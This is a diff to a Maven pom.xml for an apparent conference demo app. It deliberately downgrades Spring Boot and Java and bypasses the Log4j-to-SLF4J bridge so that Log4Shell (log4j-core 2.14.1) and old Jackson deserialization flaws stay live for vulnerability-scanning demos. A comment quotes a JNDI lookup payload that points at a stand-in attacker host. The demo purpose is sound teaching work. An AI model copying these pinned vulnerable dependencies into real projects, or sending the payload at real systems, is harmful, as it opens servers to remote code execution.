@@ -19,7 +19,14 @@
 	<parent>
 		<groupId>org.springframework.boot</groupId>
 		<artifactId>spring-boot-starter-parent</artifactId>
-		<version>4.1.0</version>
+		<!--
+		    ⚠️  Pinned to 2.7.18 (last Spring Boot 2.x) so the app runs on Java 11.
+		    log4j-core 2.14.1 has binary incompatibilities with Java 17 that prevent startup;
+		    Java 11 is the highest JVM version where 2.14.1 runs without JVM-level crashes.
+		    Spring Boot 2.7.x also keeps the Ubuntu Jammy packages older, maximising CVEs for
+		    the Trivy scan demo.
+		-->
+		<version>2.7.18</version>
 		<relativePath/> <!-- lookup parent from repository -->
 	</parent>
 	<groupId>com.example</groupId>
@@ -29,26 +36,51 @@
 	<description>Hello Conference — intentionally includes vulnerable dependencies for security scanning demos</description>
 
 	<properties>
-		<java.version>25</java.version>
+		<!-- Java 11: log4j 2.14.1 works without JVM lambda-verification crashes on 11 -->
+		<java.version>11</java.version>
 	</properties>
 
 	<dependencies>
 		<dependency>
 			<groupId>org.springframework.boot</groupId>
-			<artifactId>spring-boot-starter-webmvc</artifactId>
+			<artifactId>spring-boot-starter-web</artifactId>
+			<exclusions>
+				<!--
+				    ⚠️  DEMO FIX: exclude the log4j-to-slf4j bridge.
+				    Spring Boot routes Log4j2 API → SLF4J → Logback, completely bypassing
+				    log4j-core 2.14.1 and its JNDI processor.  Removing this bridge forces
+				    Log4j2 API to call log4j-core 2.14.1 directly → Log4Shell is active.
+				-->
+				<exclusion>
+					<groupId>org.apache.logging.log4j</groupId>
+					<artifactId>log4j-to-slf4j</artifactId>
+				</exclusion>
+			</exclusions>
 		</dependency>
 
 		<dependency>
 			<groupId>org.springframework.boot</groupId>
-			<artifactId>spring-boot-starter-webmvc-test</artifactId>
+			<artifactId>spring-boot-starter-test</artifactId>
 			<scope>test</scope>
 		</dependency>
 
 		<!--
-			⚠️  Log4Shell — CVE-2021-44228 (CVSS 10.0)
-			Version 2.14.1 is the last version BEFORE the fix.
-			Any application that logs user-controlled input is vulnerable to RCE
-			via JNDI lookup strings like ${jndi:ldap://attacker.com/exploit}.
+		    ⚠️  log4j-api must match log4j-core exactly.
+		    The newer log4j-api (2.17.x from Spring Boot 2.7.x) removed LoaderUtil.getClassLoaders()
+		    which log4j-core 2.14.1 calls at startup → NoSuchMethodError.
+		    Forcing api=2.14.1 fixes this; on Java 11 there is no lambda-verification crash.
+		-->
+		<dependency>
+			<groupId>org.apache.logging.log4j</groupId>
+			<artifactId>log4j-api</artifactId>
+			<version>2.14.1</version>
+		</dependency>
+
+		<!--
+		    ⚠️  Log4Shell — CVE-2021-44228 (CVSS 10.0)
+		    Version 2.14.1 is the last version BEFORE the fix.
+		    Any application that logs user-controlled input is vulnerable to RCE
+		    via JNDI lookup strings like ${jndi:ldap://attacker.com/exploit}.
 		-->
 		<dependency>
 			<groupId>org.apache.logging.log4j</groupId>
@@ -57,15 +89,36 @@
 		</dependency>
 
 		<!--
-			⚠️  Jackson Databind — multiple deserialization CVEs (2019-2021)
-			CVE-2019-14379, CVE-2019-14439, CVE-2020-24616, CVE-2020-24750, etc.
-			With enableDefaultTyping(), an attacker can instantiate arbitrary classes
-			via crafted JSON payloads.
+		    ⚠️  Jackson Databind — multiple deserialization CVEs (2019-2021)
+		    CVE-2019-14379, CVE-2019-14439, CVE-2020-24616, CVE-2020-24750, etc.
+		    With enableDefaultTyping(), an attacker can instantiate arbitrary classes
+		    via crafted JSON payloads.
 		-->
 		<dependency>
 			<groupId>com.fasterxml.jackson.core</groupId>
 			<artifactId>jackson-databind</artifactId>
 			<!-- Intentionally old for demo purpose -->
+			<version>2.9.10</version>
+		</dependency>
+		<!--
+		    ⚠️  Pin jackson-datatype-jsr310 to match jackson-databind 2.9.10.
+		    Spring Boot 2.7.x would otherwise pull in jsr310:2.14.x which uses
+		    ToStringSerializerBase — a class that does not exist in databind 2.9.10,
+		    causing a NoClassDefFoundError at startup.
+		-->
+		<dependency>
+			<groupId>com.fasterxml.jackson.datatype</groupId>
+			<artifactId>jackson-datatype-jsr310</artifactId>
+			<version>2.9.10</version>
+		</dependency>
+		<dependency>
+			<groupId>com.fasterxml.jackson.core</groupId>
+			<artifactId>jackson-annotations</artifactId>
+			<version>2.9.10</version>
+		</dependency>
+		<dependency>
+			<groupId>com.fasterxml.jackson.core</groupId>
+			<artifactId>jackson-core</artifactId>
 			<version>2.9.10</version>
 		</dependency>
 	</dependencies>
